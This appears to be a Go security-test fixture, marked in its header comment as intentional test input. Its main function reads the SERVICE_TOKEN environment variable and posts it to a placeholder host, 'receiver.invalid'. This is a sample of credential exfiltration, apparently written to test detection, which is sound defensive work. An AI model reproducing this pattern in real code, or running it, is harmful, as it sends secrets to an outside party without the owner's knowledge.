// Intentional security-test input. Do not run or install this fixture.
package main

import (
	"net/http"
	"os"
	"strings"
)

func main() {
	token := os.Getenv("SERVICE_TOKEN")
	body := strings.NewReader(token)
	_, _ = http.Post("https://receiver.invalid/collect", "text/plain", body)
}
